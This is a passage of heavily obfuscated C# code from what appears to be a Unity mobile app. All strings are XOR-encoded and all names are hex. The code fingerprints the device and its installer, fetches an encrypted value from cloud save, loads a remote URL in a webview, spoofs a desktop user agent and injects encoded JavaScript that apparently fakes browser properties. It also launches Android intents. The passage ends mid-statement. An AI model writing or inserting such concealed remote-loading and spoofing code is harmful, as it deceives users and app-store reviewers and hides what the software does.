            int _0x2cb84936 = 0;
            do
            {
                _0x6f8a690f = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x85e40e1c._0x8a9d8fd6(new byte[8] { 62, 34, 47, 55, 43, 60, 7, 42 }, 78), _0x8a05b7f7, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0x8a05b7f7 }), new QueryOptions())).ToList();
                await Task.Delay(_0x826a9d6d);
            }
            while (_0x6f8a690f.Count == 0 && _0x2cb84936++ < _0x4007c2a9);
            {
#if B_LOGS
                {
                    Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[33] { 11, 4, 53, 35, 36, 13, 112, 3, 49, 38, 53, 52, 112, 28, 57, 62, 59, 112, 1, 37, 53, 34, 41, 112, 34, 53, 35, 37, 60, 36, 35, 106, 112 }, 80) + JsonConvert.SerializeObject(_0x6f8a690f, Formatting.Indented));
                }
#endif
            }

            {
#if B_LOGS
                {
                    Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[39] { 142, 129, 176, 166, 161, 136, 245, 134, 180, 163, 176, 177, 245, 153, 188, 187, 190, 245, 132, 160, 176, 167, 172, 245, 167, 176, 166, 160, 185, 161, 166, 245, 182, 186, 160, 187, 161, 239, 245 }, 213) + _0x6f8a690f.Count);
                }
#endif
            }

            var _0xed234e3d = _0x6f8a690f.SelectMany(_0x00afede5 => _0x00afede5.Data).FirstOrDefault(_0x9b2a5594 => _0x9b2a5594.Key == _0x8a05b7f7)?.Value.GetAs<string>() ?? string.Empty;
            _0xed234e3d = Decrypt(_0xed234e3d, _0x8a05b7f7);
            {
#if B_LOGS
                {
                    Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[24] { 111, 96, 81, 71, 64, 105, 20, 120, 91, 85, 80, 20, 71, 85, 66, 81, 80, 20, 88, 93, 90, 95, 14, 20 }, 52) + _0xed234e3d);
                }
#endif
            }

            return _0xed234e3d;
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[39] { 18, 29, 44, 58, 61, 20, 105, 14, 44, 61, 105, 38, 59, 105, 57, 40, 59, 58, 44, 105, 58, 40, 63, 44, 45, 105, 37, 32, 39, 34, 105, 47, 40, 32, 37, 44, 45, 115, 105 }, 73) + ex.Message);
                }
#endif
            }

            return string.Empty;
        }
    }

    private async Task _0xda6686b2()
    {
        if (await _0x19dcb358())
            return;
        if (await _0x5dd95860())
            return;
        if (await _0x9bda1bf9())
            return;
        _0x09ac9bb6();
        await _0x5800513b(_0x8dfcaca2());
        _0xc6176bcb = await _0xc554ac28();
        await _0x44f6afb1();
    }

    private async void Start()
    {
        await _0xda6686b2();
    }

    internal Rect lastSafe = Rect.zero;
    private bool _0x86b94f6b()
    {
        var _0xc6e40988 = Keyboard.current;
        return _0xc6e40988 != null && _0xc6e40988.escapeKey.wasPressedThisFrame;
    }

    private void _0x8631a3c2()
    {
        WLog(_0x85e40e1c._0x8a9d8fd6(new byte[21] { 8, 33, 50, 36, 55, 33, 50, 37, 96, 34, 33, 35, 43, 96, 48, 50, 37, 51, 51, 37, 36 }, 64));
        if (Time.frameCount == _0x1464989c)
            return;
        _0x1464989c = Time.frameCount;
        if (_0xa2cb4ecc())
            return;
        _0xd56e64d9();
    }

    private void _0x09ac9bb6()
    {
        {
#if B_LOGS
            Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[22] { 36, 43, 26, 12, 11, 34, 95, 44, 11, 16, 13, 26, 59, 26, 9, 22, 28, 26, 54, 17, 25, 16 }, 127));
#endif
        }

        _0xea9f1f55 = SystemInfo.deviceModel;
        _0x2833a1a0 = Application.version;
        _0xfe372202 = Application.installMode;
        _0x47fd9f3e = Application.installerName;
        _0x7cc68d45 = Application.identifier;
        _0xaa1aa834 = _0xd028b867();
        _0xea92aa99 = _0x38d5031c();
        _0x51e8bac0 = SystemInfo.deviceUniqueIdentifier;
        _0x72616a4f = SystemInfo.graphicsDeviceName;
        _0xe3e7660c = SystemInfo.processorType;
        {
#if B_LOGS
            {
                _0x2833a1a0 = _0x85e40e1c._0x8a9d8fd6(new byte[5] { 179, 170, 179, 170, 179 }, 132);
                _0xfe372202 = ApplicationInstallMode.Store;
                _0x47fd9f3e = _0x85e40e1c._0x8a9d8fd6(new byte[19] { 249, 245, 247, 180, 251, 244, 254, 232, 245, 243, 254, 180, 236, 255, 244, 254, 243, 244, 253 }, 154);
                _0xea92aa99 = _0x85e40e1c._0x8a9d8fd6(new byte[8] { 177, 185, 164, 160, 173, 244, 161, 181 }, 212);
                _0x51e8bac0 = Guid.NewGuid().ToString().Replace(_0x85e40e1c._0x8a9d8fd6(new byte[1] { 152 }, 181), "");
            }
#endif
        }

        {
#if B_LOGS
            Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[17] { 145, 158, 175, 185, 190, 151, 234, 174, 175, 188, 135, 165, 174, 175, 166, 240, 234 }, 202) + _0xea9f1f55);
            Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[19] { 136, 135, 182, 160, 167, 142, 243, 178, 163, 163, 133, 182, 161, 160, 186, 188, 189, 233, 243 }, 211) + _0x2833a1a0);
            Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[20] { 152, 151, 166, 176, 183, 158, 227, 170, 173, 176, 183, 162, 175, 175, 142, 172, 167, 166, 249, 227 }, 195) + _0xfe372202);
            Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[23] { 240, 255, 206, 216, 223, 246, 139, 194, 197, 216, 223, 202, 199, 199, 206, 217, 248, 223, 196, 217, 206, 145, 139 }, 171) + _0x47fd9f3e);
            Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[14] { 40, 39, 22, 0, 7, 46, 83, 18, 3, 3, 58, 23, 73, 83 }, 115) + _0x7cc68d45);
            Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[14] { 193, 206, 255, 233, 238, 199, 186, 251, 254, 236, 211, 254, 160, 186 }, 154) + _0xaa1aa834);
            Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[18] { 49, 62, 15, 25, 30, 55, 74, 31, 25, 15, 24, 43, 13, 15, 4, 30, 80, 74 }, 106) + _0xea92aa99);
            Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[17] { 14, 1, 48, 38, 33, 8, 117, 38, 44, 38, 17, 48, 35, 28, 49, 111, 117 }, 85) + _0x51e8bac0);
            Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[12] { 194, 205, 252, 234, 237, 196, 185, 254, 233, 236, 163, 185 }, 153) + _0x72616a4f);
            Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[12] { 112, 127, 78, 88, 95, 118, 11, 72, 91, 94, 17, 11 }, 43) + _0xe3e7660c);
#endif
        }
    }

    private static bool IsPrivacyItemTrue(Item _0xa2f5fc93)
    {
        if (_0xa2f5fc93.Key != _0x85e40e1c._0x8a9d8fd6(new byte[9] { 246, 236, 207, 237, 246, 233, 254, 252, 230 }, 159))
            return false;
        try
        {
            var _0x4306fa74 = _0xa2f5fc93.Value.GetAs<object>();
            return _0x4306fa74 switch
            {
                bool b => b,
                string s when bool.TryParse(s, out var parsed) => parsed,
                _ => false
            };
        }
        catch
        {
            return false;
        }
    }

    private void _0xc2e5068c(bool _0xbca84cc3)
    {
        _0x61f67c34();
        _0x0cc76f24.SetActive(_0xbca84cc3);
        _0x5a1ea031 = _0xbca84cc3;
        if (_0xbca84cc3)
        {
            _0x0cc76f24.transform.SetAsLastSibling();
            if (_0xc42e8284 != null)
                _0xc42e8284.localRotation = Quaternion.identity;
        }
    }

    private bool _0x8b31787f = false;
    private string _0xe3e7660c = "";
    private bool _0x3b60e40c = false;
    private string _0x51e8bac0 = "";
    // WS_SOURCE MONO
    public static _0xdf35893b _0x20d63bf4 { get; private set; }

    private bool _0xad0f7bc3()
    {
        _0x6e32f3ba.RemoveAll(_0x2b332c97 => _0x2b332c97 == null || !_0x2b332c97.IsAlive);
        return _0x6e32f3ba.Count > 0;
    }

    private string _0x8a05b7f7 = "";
    private void _0x21a40d0f()
    {
        if (_0x3053905e == null)
            return;
        if (_0x8b31787f)
            _0x3053905e.SetUserAgent(_0xba975fa4());
        else
            _0x3053905e.SetUserAgent("");
    }

    private string _0xaa1aa834 = "";
    internal Vector2 lastSize = Vector2.zero;
    private bool _0x5ee4ddc6(string _0x59f89512)
    {
        try
        {
            using (var _0xf71217dd = new AndroidJavaClass(_0x85e40e1c._0x8a9d8fd6(new byte[30] { 158, 146, 144, 211, 136, 147, 148, 137, 132, 206, 153, 211, 141, 145, 156, 132, 152, 143, 211, 168, 147, 148, 137, 132, 173, 145, 156, 132, 152, 143 }, 253)))
            using (var _0x971857b1 = _0xf71217dd.GetStatic<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[15] { 40, 62, 57, 57, 46, 37, 63, 10, 40, 63, 34, 61, 34, 63, 50 }, 75)))
            using (var _0x4545781b = _0x971857b1.Call<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[17] { 231, 229, 244, 208, 225, 227, 235, 225, 231, 229, 205, 225, 238, 225, 231, 229, 242 }, 128)))
            using (var _0xdcd73795 = new AndroidJavaClass(_0x85e40e1c._0x8a9d8fd6(new byte[22] { 192, 207, 197, 211, 206, 200, 197, 143, 194, 206, 207, 213, 196, 207, 213, 143, 232, 207, 213, 196, 207, 213 }, 161)))
            using (var _0x6beabf28 = _0xdcd73795.CallStatic<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[8] { 148, 133, 150, 151, 129, 177, 150, 141 }, 228), _0x59f89512, 1))
            {
                string _0x98516da7 = _0x6beabf28.Call<string>(_0x85e40e1c._0x8a9d8fd6(new byte[14] { 70, 68, 85, 114, 85, 83, 72, 79, 70, 100, 89, 85, 83, 64 }, 33), _0x85e40e1c._0x8a9d8fd6(new byte[20] { 77, 93, 64, 88, 92, 74, 93, 112, 73, 78, 67, 67, 77, 78, 76, 68, 112, 90, 93, 67 }, 47));
                string _0x78dea650 = _0x6beabf28.Call<string>(_0x85e40e1c._0x8a9d8fd6(new byte[10] { 254, 252, 237, 201, 248, 250, 242, 248, 254, 252 }, 153));
                _0x6beabf28.Call<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[11] { 221, 216, 216, 255, 221, 200, 217, 219, 211, 206, 197 }, 188), _0x85e40e1c._0x8a9d8fd6(new byte[33] { 18, 29, 23, 1, 28, 26, 23, 93, 26, 29, 7, 22, 29, 7, 93, 16, 18, 7, 22, 20, 28, 1, 10, 93, 49, 33, 60, 36, 32, 50, 49, 63, 54 }, 115));
                _0x6beabf28.Call<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[11] { 117, 98, 106, 104, 113, 98, 66, 127, 115, 117, 102 }, 7), _0x85e40e1c._0x8a9d8fd6(new byte[20] { 143, 159, 130, 154, 158, 136, 159, 178, 139, 140, 129, 129, 143, 140, 142, 134, 178, 152, 159, 129 }, 237));
                if (_0x6beabf28.Call<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[15] { 182, 161, 183, 171, 168, 178, 161, 133, 167, 176, 173, 178, 173, 176, 189 }, 196), _0x4545781b) != null)
                {
                    WLog(_0x85e40e1c._0x8a9d8fd6(new byte[24] { 54, 29, 7, 26, 24, 16, 57, 28, 30, 16, 85, 26, 5, 16, 27, 85, 28, 27, 1, 16, 27, 1, 79, 85 }, 117) + _0x59f89512);
                    _0x6beabf28.Call<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[8] { 233, 236, 236, 206, 228, 233, 239, 251 }, 136), 0x10000000);
                    _0x971857b1.Call(_0x85e40e1c._0x8a9d8fd6(new byte[13] { 206, 201, 220, 207, 201, 252, 222, 201, 212, 203, 212, 201, 196 }, 189), _0x6beabf28);
                    return true;
                }

                if (_0xe33ac0e7(_0x78dea650))
                    return true;
                if (!string.IsNullOrEmpty(_0x98516da7))
                {
                    WLog(_0x85e40e1c._0x8a9d8fd6(new byte[28] { 68, 111, 117, 104, 106, 98, 75, 110, 108, 98, 39, 110, 105, 115, 98, 105, 115, 39, 97, 102, 107, 107, 101, 102, 100, 108, 61, 39 }, 7) + _0x98516da7);
                    if (_0x3233b08f(_0x98516da7))
                        return _0xffed205c(_0x98516da7, _0x78dea650);
                    return _0x3f68adbc(_0x98516da7);
                }

                WLog(_0x85e40e1c._0x8a9d8fd6(new byte[30] { 143, 164, 190, 163, 161, 169, 128, 165, 167, 169, 236, 165, 162, 184, 169, 162, 184, 236, 162, 163, 236, 164, 173, 162, 168, 160, 169, 190, 246, 236 }, 204) + _0x59f89512);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x85e40e1c._0x8a9d8fd6(new byte[26] { 207, 228, 254, 227, 225, 233, 192, 229, 231, 233, 172, 229, 226, 248, 233, 226, 248, 172, 234, 237, 229, 224, 233, 232, 182, 172 }, 140) + e.Message);
            return true;
        }
    }

    internal string _0xd8fc6655(string _0x4ec7947c)
    {
        int _0x529596b1 = _0x4ec7947c.IndexOf(_0x85e40e1c._0x8a9d8fd6(new byte[3] { 97, 108, 53 }, 8), StringComparison.OrdinalIgnoreCase);
        if (_0x529596b1 < 0)
            return null;
        string _0x408a01a0 = _0x4ec7947c.Substring(_0x529596b1 + 3);
        int _0xcf353727 = _0x408a01a0.IndexOf('&');
        return _0xcf353727 >= 0 ? _0x408a01a0.Substring(0, _0xcf353727) : _0x408a01a0;
    }

    // MAIN FLOW
    private bool _0xd0661d71 { get; set; }

    internal bool IsGoogleAuthFlowUrl(string _0x45be5246)
    {
        if (string.IsNullOrEmpty(_0x45be5246))
            return false;
        return _0x45be5246.IndexOf(_0x85e40e1c._0x8a9d8fd6(new byte[19] { 220, 222, 222, 210, 200, 211, 201, 206, 147, 218, 210, 210, 218, 209, 216, 147, 222, 210, 208 }, 189), StringComparison.OrdinalIgnoreCase) >= 0 || _0x45be5246.IndexOf(_0x85e40e1c._0x8a9d8fd6(new byte[16] { 100, 102, 102, 106, 112, 107, 113, 118, 43, 98, 106, 106, 98, 105, 96, 43 }, 5), StringComparison.OrdinalIgnoreCase) >= 0 || _0x45be5246.IndexOf(_0x85e40e1c._0x8a9d8fd6(new byte[21] { 56, 48, 48, 56, 51, 58, 42, 44, 58, 45, 60, 48, 49, 43, 58, 49, 43, 113, 60, 48, 50 }, 95), StringComparison.OrdinalIgnoreCase) >= 0 || _0x45be5246.IndexOf(_0x85e40e1c._0x8a9d8fd6(new byte[11] { 36, 48, 55, 34, 55, 42, 32, 109, 32, 44, 46 }, 67), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private readonly List<UniWebViewPopup> _0x6e32f3ba = new List<UniWebViewPopup>();
    private IEnumerator _0xd5385cca(Dictionary<string, object> _0x84791559)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[30] { 118, 121, 72, 94, 89, 112, 13, 107, 72, 89, 78, 69, 13, 104, 85, 89, 95, 76, 13, 125, 88, 94, 69, 13, 105, 76, 89, 76, 23, 13 }, 45) + string.Join(_0x85e40e1c._0x8a9d8fd6(new byte[1] { 14 }, 7), _0x84791559));
#endif
            }
        }

        string _0xba1543d2 = "";
        // Primary source: nested JSON under "notificationData"
        if (_0x84791559 != null && _0x84791559.TryGetValue(_0x85e40e1c._0x8a9d8fd6(new byte[16] { 124, 125, 102, 123, 116, 123, 113, 115, 102, 123, 125, 124, 86, 115, 102, 115 }, 18), out var raw))
        {
            try
            {
                var _0xb4ab1300 = raw?.ToString();
                var _0x0246cd3d = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0xb4ab1300);
                if (_0x0246cd3d != null && _0x0246cd3d.TryGetValue(_0x85e40e1c._0x8a9d8fd6(new byte[6] { 241, 231, 236, 230, 235, 230 }, 130), out var val))
                {
                    _0xba1543d2 = val?.ToString();
                }
            }
            catch (Exception e)
            {
#if B_LOGS
                Debug.LogError(_0x85e40e1c._0x8a9d8fd6(new byte[30] { 42, 37, 20, 2, 5, 81, 33, 4, 2, 25, 44, 81, 59, 34, 62, 63, 81, 1, 16, 3, 2, 20, 81, 20, 3, 3, 30, 3, 75, 81 }, 113) + e);
#endif
            }
        }

        // Fallback: flat structure
        if (string.IsNullOrEmpty(_0xba1543d2) && _0x84791559 != null && _0x84791559.TryGetValue(_0x85e40e1c._0x8a9d8fd6(new byte[6] { 184, 174, 165, 175, 162, 175 }, 203), out var lab))
        {
            _0xba1543d2 = lab?.ToString();
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[38] { 46, 33, 16, 6, 1, 85, 37, 0, 6, 29, 40, 85, 51, 16, 1, 22, 29, 16, 17, 85, 6, 16, 27, 17, 28, 17, 85, 19, 7, 26, 24, 85, 31, 6, 26, 27, 79, 85 }, 117) + _0xba1543d2);
            }
#endif
        }

        if (string.IsNullOrEmpty(_0xba1543d2))
            yield break;
        {
#if B_LOGS
            {
                Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[38] { 120, 119, 70, 80, 87, 3, 115, 86, 80, 75, 126, 3, 116, 66, 74, 87, 3, 87, 76, 3, 76, 83, 70, 77, 3, 84, 74, 87, 75, 3, 80, 70, 77, 71, 74, 71, 25, 3 }, 35) + _0xba1543d2);
            }
#endif
        }

        _0x12e1abed = _0xba1543d2;
        yield return new WaitUntil(() => _0xacdd5220);
        var _0x6ed1bc94 = _0x95ff0455(2, 100);
        yield return new WaitUntil(() => _0x6ed1bc94.IsCompleted);
        string _0x115de204 = _0x6ed1bc94.Result;
        if (!string.IsNullOrEmpty(_0x115de204))
        {
            string _0x0a7aba3f = _0x809202a1(_0x115de204, _0xba1543d2);
            {
#if B_LOGS
                Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[33] { 56, 55, 6, 16, 23, 67, 51, 22, 16, 11, 62, 67, 49, 6, 15, 12, 2, 7, 67, 52, 6, 1, 53, 10, 6, 20, 67, 20, 10, 23, 11, 89, 67 }, 99) + _0x0a7aba3f);
#endif
            }

            _0x3053905e.Load(_0x0a7aba3f);
        }
    }

    private string _0xc6176bcb = "";
    private string _0x2102bd9a()
    {
        return _0x85e40e1c._0x8a9d8fd6(new byte[12] { 133, 203, 216, 195, 206, 217, 196, 194, 195, 133, 132, 214 }, 173) + _0x85e40e1c._0x8a9d8fd6(new byte[8] { 36, 51, 32, 114, 39, 51, 111, 117 }, 82) + WindowsDesktopUserAgent + _0x85e40e1c._0x8a9d8fd6(new byte[2] { 173, 177 }, 138) + _0x85e40e1c._0x8a9d8fd6(new byte[30] { 197, 210, 193, 147, 195, 193, 220, 199, 220, 142, 253, 210, 197, 218, 212, 210, 199, 220, 193, 157, 195, 193, 220, 199, 220, 199, 202, 195, 214, 136 }, 179) + _0x85e40e1c._0x8a9d8fd6(new byte[121] { 193, 210, 201, 196, 211, 206, 200, 201, 135, 195, 194, 193, 143, 200, 197, 205, 139, 204, 194, 222, 139, 209, 198, 203, 142, 220, 211, 213, 222, 220, 232, 197, 205, 194, 196, 211, 137, 195, 194, 193, 206, 201, 194, 247, 213, 200, 215, 194, 213, 211, 222, 143, 200, 197, 205, 139, 204, 194, 222, 139, 220, 192, 194, 211, 157, 193, 210, 201, 196, 211, 206, 200, 201, 143, 142, 220, 213, 194, 211, 210, 213, 201, 135, 209, 198, 203, 156, 218, 139, 196, 200, 201, 193, 206, 192, 210, 213, 198, 197, 203, 194, 157, 211, 213, 210, 194, 218, 142, 156, 218, 196, 198, 211, 196, 207, 143, 194, 142, 220, 218, 218 }, 167) + _0x85e40e1c._0x8a9d8fd6(new byte[26] { 62, 63, 60, 114, 42, 40, 53, 46, 53, 118, 125, 47, 41, 63, 40, 27, 61, 63, 52, 46, 125, 118, 47, 59, 115, 97 }, 90) + _0x85e40e1c._0x8a9d8fd6(new byte[130] { 58, 59, 56, 118, 46, 44, 49, 42, 49, 114, 121, 63, 46, 46, 8, 59, 44, 45, 55, 49, 48, 121, 114, 121, 107, 112, 110, 126, 118, 9, 55, 48, 58, 49, 41, 45, 126, 16, 10, 126, 111, 110, 112, 110, 101, 126, 9, 55, 48, 104, 106, 101, 126, 38, 104, 106, 119, 126, 31, 46, 46, 50, 59, 9, 59, 60, 21, 55, 42, 113, 107, 109, 105, 112, 109, 104, 126, 118, 21, 22, 10, 19, 18, 114, 126, 50, 55, 53, 59, 126, 25, 59, 61, 53, 49, 119, 126, 29, 54, 44, 49, 51, 59, 113, 111, 108, 110, 112, 110, 112, 110, 112, 110, 126, 13, 63, 56, 63, 44, 55, 113, 107, 109, 105, 112, 109, 104, 121, 119, 101 }, 94) + _0x85e40e1c._0x8a9d8fd6(new byte[30] { 49, 48, 51, 125, 37, 39, 58, 33, 58, 121, 114, 37, 57, 52, 33, 51, 58, 39, 56, 114, 121, 114, 2, 60, 59, 102, 103, 114, 124, 110 }, 85) + _0x85e40e1c._0x8a9d8fd6(new byte[34] { 102, 103, 100, 42, 114, 112, 109, 118, 109, 46, 37, 116, 103, 108, 102, 109, 112, 37, 46, 37, 69, 109, 109, 101, 110, 103, 34, 75, 108, 97, 44, 37, 43, 57 }, 2) + _0x85e40e1c._0x8a9d8fd6(new byte[30] { 124, 125, 126, 48, 104, 106, 119, 108, 119, 52, 63, 117, 121, 96, 76, 119, 109, 123, 112, 72, 119, 113, 118, 108, 107, 63, 52, 40, 49, 35 }, 24) + _0x85e40e1c._0x8a9d8fd6(new byte[449] { 55, 49, 58, 56, 53, 34, 49, 99, 54, 34, 39, 126, 56, 33, 49, 34, 45, 39, 48, 121, 24, 56, 33, 49, 34, 45, 39, 121, 100, 0, 43, 49, 44, 46, 42, 54, 46, 100, 111, 53, 38, 49, 48, 42, 44, 45, 121, 100, 114, 113, 115, 100, 62, 111, 56, 33, 49, 34, 45, 39, 121, 100, 4, 44, 44, 36, 47, 38, 99, 0, 43, 49, 44, 46, 38, 100, 111, 53, 38, 49, 48, 42, 44, 45, 121, 100, 114, 113, 115, 100, 62, 111, 56, 33, 49, 34, 45, 39, 121, 100, 13, 44, 55, 126, 2, 124, 1, 49, 34, 45, 39, 100, 111, 53, 38, 49, 48, 42, 44, 45, 121, 100, 113, 119, 100, 62, 30, 111, 46, 44, 33, 42, 47, 38, 121, 37, 34, 47, 48, 38, 111, 51, 47, 34, 55, 37, 44, 49, 46, 121, 100, 20, 42, 45, 39, 44, 52, 48, 100, 111, 36, 38, 55, 11, 42, 36, 43, 6, 45, 55, 49, 44, 51, 58, 21, 34, 47, 54, 38, 48, 121, 37, 54, 45, 32, 55, 42, 44, 45, 107, 106, 56, 49, 38, 55, 54, 49, 45, 99, 19, 49, 44, 46, 42, 48, 38, 109, 49, 38, 48, 44, 47, 53, 38, 107, 56, 34, 49, 32, 43, 42, 55, 38, 32, 55, 54, 49, 38, 121, 100, 59, 123, 117, 100, 111, 33, 42, 55, 45, 38, 48, 48, 121, 100, 117, 119, 100, 111, 46, 44, 33, 42, 47, 38, 121, 37, 34, 47, 48, 38, 111, 46, 44, 39, 38, 47, 121, 100, 100, 111, 51, 47, 34, 55, 37, 44, 49, 46, 121, 100, 20, 42, 45, 39, 44, 52, 48, 100, 111, 51, 47, 34, 55, 37, 44, 49, 46, 21, 38, 49, 48, 42, 44, 45, 121, 100, 114, 118, 109, 115, 109, 115, 100, 111, 54, 34, 5, 54, 47, 47, 21, 38, 49, 48, 42, 44, 45, 121, 100, 114, 113, 115, 109, 115, 109, 115, 109, 115, 100, 62, 106, 120, 62, 62, 120, 12, 33, 41, 38, 32, 55, 109, 39, 38, 37, 42, 45, 38, 19, 49, 44, 51, 38, 49, 55, 58, 107, 51, 49, 44, 55, 44, 111, 100, 54, 48, 38, 49, 2, 36, 38, 45, 55, 7, 34, 55, 34, 100, 111, 56, 36, 38, 55, 121, 37, 54, 45, 32, 55, 42, 44, 45, 107, 106, 56, 49, 38, 55, 54, 49, 45, 99, 54, 34, 39, 120, 62, 111, 32, 44, 45, 37, 42, 36, 54, 49, 34, 33, 47, 38, 121, 55, 49, 54, 38, 62, 106, 120, 62, 32, 34, 55, 32, 43, 107, 38, 106, 56, 62 }, 67) + _0x85e40e1c._0x8a9d8fd6(new byte[112] { 160, 161, 162, 236, 183, 167, 182, 161, 161, 170, 232, 227, 179, 173, 160, 176, 172, 227, 232, 245, 253, 246, 244, 237, 255, 160, 161, 162, 236, 183, 167, 182, 161, 161, 170, 232, 227, 172, 161, 173, 163, 172, 176, 227, 232, 245, 244, 252, 244, 237, 255, 160, 161, 162, 236, 183, 167, 182, 161, 161, 170, 232, 227, 165, 178, 165, 173, 168, 147, 173, 160, 176, 172, 227, 232, 245, 253, 246, 244, 237, 255, 160, 161, 162, 236, 183, 167, 182, 161, 161, 170, 232, 227, 165, 178, 165, 173, 168, 140, 161, 173, 163, 172, 176, 227, 232, 245, 244, 240, 244, 237, 255 }, 196) + _0x85e40e1c._0x8a9d8fd6(new byte[45] { 144, 150, 157, 159, 147, 141, 138, 128, 139, 147, 202, 139, 138, 144, 139, 145, 135, 140, 151, 144, 133, 150, 144, 217, 145, 138, 128, 129, 130, 141, 138, 129, 128, 223, 153, 135, 133, 144, 135, 140, 204, 129, 205, 159, 153 }, 228) + _0x85e40e1c._0x8a9d8fd6(new byte[721] { 138, 140, 135, 133, 136, 159, 140, 222, 145, 140, 151, 153, 195, 137, 151, 144, 154, 145, 137, 208, 147, 159, 138, 157, 150, 179, 155, 154, 151, 159, 208, 156, 151, 144, 154, 214, 137, 151, 144, 154, 145, 137, 215, 197, 137, 151, 144, 154, 145, 137, 208, 147, 159, 138, 157, 150, 179, 155, 154, 151, 159, 195, 152, 139, 144, 157, 138, 151, 145, 144, 214, 143, 215, 133, 136, 159, 140, 222, 141, 195, 173, 138, 140, 151, 144, 153, 214, 143, 215, 208, 138, 145, 178, 145, 137, 155, 140, 189, 159, 141, 155, 214, 215, 197, 151, 152, 214, 141, 208, 151, 144, 154, 155, 134, 177, 152, 214, 217, 142, 145, 151, 144, 138, 155, 140, 196, 222, 157, 145, 159, 140, 141, 155, 217, 215, 192, 195, 206, 130, 130, 141, 208, 151, 144, 154, 155, 134, 177, 152, 214, 217, 150, 145, 136, 155, 140, 196, 222, 144, 145, 144, 155, 217, 215, 192, 195, 206, 130, 130, 141, 208, 151, 144, 154, 155, 134, 177, 152, 214, 217, 147, 159, 134, 211, 137, 151, 154, 138, 150, 217, 215, 192, 195, 206, 130, 130, 141, 208, 151, 144, 154, 155, 134, 177, 152, 214, 217, 147, 159, 134, 211, 154, 155, 136, 151, 157, 155, 211, 137, 151, 154, 138, 150, 217, 215, 192, 195, 206, 215, 140, 155, 138, 139, 140, 144, 222, 133, 147, 159, 138, 157, 150, 155, 141, 196, 152, 159, 146, 141, 155, 210, 147, 155, 154, 151, 159, 196, 143, 210, 145, 144, 157, 150, 159, 144, 153, 155, 196, 144, 139, 146, 146, 210, 159, 154, 154, 178, 151, 141, 138, 155, 144, 155, 140, 196, 152, 139, 144, 157, 138, 151, 145, 144, 214, 215, 133, 131, 210, 140, 155, 147, 145, 136, 155, 178, 151, 141, 138, 155, 144, 155, 140, 196, 152, 139, 144, 157, 138, 151, 145, 144, 214, 215, 133, 131, 210, 159, 154, 154, 187, 136, 155, 144, 138, 178, 151, 141, 138, 155, 144, 155, 140, 196, 152, 139, 144, 157, 138, 151, 145, 144, 214, 215, 133, 131, 210, 140, 155, 147, 145, 136, 155, 187, 136, 155, 144, 138, 178, 151, 141, 138, 155, 144, 155, 140, 196, 152, 139, 144, 157, 138, 151, 145, 144, 214, 215, 133, 131, 210, 154, 151, 141, 142, 159, 138, 157, 150, 187, 136, 155, 144, 138, 196, 152, 139, 144, 157, 138, 151, 145, 144, 214, 215, 133, 140, 155, 138, 139, 140, 144, 222, 152, 159, 146, 141, 155, 197, 131, 131, 197, 151, 152, 214, 141, 208, 151, 144, 154, 155, 134, 177, 152, 214, 217, 142, 145, 151, 144, 138, 155, 140, 196, 222, 152, 151, 144, 155, 217, 215, 192, 195, 206, 130, 130, 141, 208, 151, 144, 154, 155, 134, 177, 152, 214, 217, 150, 145, 136, 155, 140, 196, 222, 150, 145, 136, 155, 140, 217, 215, 192, 195, 206, 215, 140, 155, 138, 139, 140, 144, 222, 133, 147, 159, 138, 157, 150, 155, 141, 196, 138, 140, 139, 155, 210, 147, 155, 154, 151, 159, 196, 143, 210, 145, 144, 157, 150, 159, 144, 153, 155, 196, 144, 139, 146, 146, 210, 159, 154, 154, 178, 151, 141, 138, 155, 144, 155, 140, 196, 152, 139, 144, 157, 138, 151, 145, 144, 214, 215, 133, 131, 210, 140, 155, 147, 145, 136, 155, 178, 151, 141, 138, 155, 144, 155, 140, 196, 152, 139, 144, 157, 138, 151, 145, 144, 214, 215, 133, 131, 210, 159, 154, 154, 187, 136, 155, 144, 138, 178, 151, 141, 138, 155, 144, 155, 140, 196, 152, 139, 144, 157, 138, 151, 145, 144, 214, 215, 133, 131, 210, 140, 155, 147, 145, 136, 155, 187, 136, 155, 144, 138, 178, 151, 141, 138, 155, 144, 155, 140, 196, 152, 139, 144, 157, 138, 151, 145, 144, 214, 215, 133, 131, 210, 154, 151, 141, 142, 159, 138, 157, 150, 187, 136, 155, 144, 138, 196, 152, 139, 144, 157, 138, 151, 145, 144, 214, 215, 133, 140, 155, 138, 139, 140, 144, 222, 152, 159, 146, 141, 155, 197, 131, 131, 197, 140, 155, 138, 139, 140, 144, 222, 145, 140, 151, 153, 214, 143, 215, 197, 131, 197, 131, 157, 159, 138, 157, 150, 214, 155, 215, 133, 131 }, 254) + _0x85e40e1c._0x8a9d8fd6(new 